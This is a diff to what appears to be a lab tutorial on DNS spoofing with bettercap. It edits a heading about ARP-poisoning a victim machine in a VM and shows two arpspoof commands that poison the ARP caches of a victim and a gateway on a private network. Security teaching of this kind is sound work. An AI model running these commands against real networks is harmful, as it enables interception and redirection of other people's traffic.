@@ -1,8 +1,6 @@
 We are going to perform DNS spoof attack using **bettercap** tool ------
 
-Step 1 :
-
-## First we have to perform Arp-Poisoning atttack with the victim machine 
+## Step 1 : First we have to perform Arp-Poisoning atttack with the victim machine 
 
 How to Perform (In VM):
 
@@ -41,3 +39,7 @@ sudo arpspoof -i eth0 -t 192.168.229.2 192.168.229.132
 
 ```
 sudo arpspoof -i eth0 -t 192.168.229.132 192.168.229.2
+```
+
+--------
+
